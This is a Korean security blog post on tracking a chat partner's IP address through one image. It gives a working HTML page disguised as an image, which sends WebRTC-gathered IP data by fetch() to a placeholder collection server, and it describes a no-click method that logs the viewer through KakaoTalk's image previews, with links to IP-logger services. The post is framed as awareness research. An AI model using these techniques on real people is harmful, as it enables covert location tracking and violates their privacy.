---
title: "사진 한 장으로 아이피 추적하기4 -결론과 총정리"
categories:
  - security
tags:
  - 잡다한 연구
---

# 📸 사진 한 장으로 아이피를 추적해보자!

우리는 평소에 별 생각 없이 카카오톡으로 이미지를 주고받는다. 그런데 이 **단 한 장의 이미지**가 상대방의 **공용 IP 주소**와 **접속 환경**을 추적하는 수단이 될 수 있다는 걸 아는가?

---

## 🧠 1. WebRTC를 활용한 IP 추적 원리

**WebRTC**는 브라우저 기반의 P2P 기술로, 영상통화나 파일 전송에 쓰인다. 이 기술은 브라우저 간 직접 통신을 만들기 때문에, 특정 조건이 맞으면 상대방의 공용 IP 주소(심지어 내부 IP까지도!)를 노출시킬 수 있다.

### ✅ 기본 절차
1. 상대방이 WebRTC 추적 기능이 포함된 웹사이트에 접속하도록 유도
2. STUN 서버를 통해 상대방의 IP 정보를 수집
3. 수집한 IP를 기반으로 위치 추정

---

## 🖼️ 2. 이미지를 이용한 WebRTC 유도 방식

이미지만으로 WebRTC를 실행할 수는 없지만, **이미지를 가장한 HTML 페이지**나 **이미지에 연결된 링크**를 통해 상대방을 WebRTC 페이지로 유도할 수 있다.

### 📌 방법 A. HTML 파일을 이미지처럼 위장

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading Image...</title>
    <script>
        async function getIPs() {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = event => {
                if (event.candidate) {
                    fetch("https://yourserver.com/log_ip", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ ip: event.candidate.candidate })
                    });
                }
            };
        }
        getIPs();
    </script>
</head>
<body>
    <img src="your_image.jpg" alt="Image Loading...">
</body>
</html>
```

- 상대방이 이 페이지를 열면, WebRTC가 실행되고 `https://yourserver.com/log_ip`로 IP 정보가 전송된다.
- VPN이 아니면 공용 IP 주소가 정확하게 잡힌다.

> ⚠️ 단점: 링크를 열어야 하며, 브라우저에서 실행돼야 한다. 모바일에선 제한될 수 있다.

---

## ✅ 3. 실전 성공 사례: 카카오톡 '사진 미리보기'로 IP 추적

우리는 WebRTC보다 현실적인 방법으로, **카카오톡의 외부 이미지 미리보기 기능**을 활용해 상대방의 IP 추적에 성공했다.

### 🎯 방식 요약
- 외부 서버에 이미지를 업로드
- 해당 이미지의 URL을 카카오톡으로 전송
- 카카오톡은 상대방 단말기에서 이미지를 불러오며 미리보기 생성
- 이 과정에서 서버에 요청이 찍히고, IP 수집 가능

### 💡 핵심 포인트
- **상대방이 클릭하지 않아도**, 단순히 대화창을 열기만 해도 IP가 수집됨
- 미리보기 이미지를 외부 서버에서 불러오기 때문에 발생하는 현상

---

## 📄 실제 서버 로그 예시

```log
[접속] 2025-04-02 13:11:58
IP: 121.162.88.214
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991N)
Referrer: KakaoTalk
Device: Samsung Galaxy S21
```

이 정보를 통해, 우리는 다음과 같은 내용을 추출할 수 있었다:
- 접속 지역 (대략적)
- 통신사 (KT, SKT 등)
- 기기 모델명
- 브라우저 및 운영체제

---

## 🌍 4. IP 분석에 사용된 도구들

| 도구 | 기능 |
|------|------|
| [ipinfo.io](https://ipinfo.io) | IP 위치, ISP, 도시, 위도/경도 정보 제공 |
| [db-ip.com](https://db-ip.com) | 좀 더 정확한 위치 및 기업/학교 정보 |
| [ip-api.com](https://ip-api.com) | JSON 형태로 제공, API 연동 쉬움 |
| [whois.domaintools.com](https://whois.domaintools.com) | 통신사 및 네트워크 소유자 확인 |

### 📌 예시 결과
```
IP: 121.162.88.214
도시: 인천광역시
통신사: SK브로드밴드
ASN: AS9318
```

---

## ⚠️ 주의사항 및 윤리적 고려

- 본 기술은 **공격용이 아니라 실험, 연구, 보안 교육** 목적으로 작성되었습니다.
- 카카오톡이나 WebRTC의 취약점을 악용할 경우 **정보통신망법, 개인정보보호법 등에 따라 형사처벌** 받을 수 있습니다.
- 실제 적용 시 반드시 **법적 절차**와 **윤리적 판단**을 기반으로 해야 합니다.

---

## 🧾 결론

| 방식 | 클릭 필요 여부 | 성공률 | 비고 |
|------|----------------|---------|------|
| WebRTC 링크 유도 | ✅ 필요 | 중간 | 브라우저 열람 필요 |
| 카카오톡 이미지 미리보기 | ❌ 불필요 | 매우 높음 | 실제 실험에서 성공 |

📌 **우리의 결론은?**  
"카톡으로 온 아무 이미지도 쉽게 열지 말자."  
단 한 장의 짤방, 단 한 장의 사진이 당신의 위치를 말해줄 수 있다.

---

### 💡 관련 도구 및 링크

- [Grabify IP Logger](https://grabify.link)
- [iplogger.org](https://iplogger.org)
- [ipinfo.io](https://ipinfo.io)
- [db-ip.com](https://db-ip.com)

---

> 작성자 주: 이 글은 실제 실험을 바탕으로 작성되었으며, 보안 인식 제고와 기술적 학습을 목적으로 합니다.
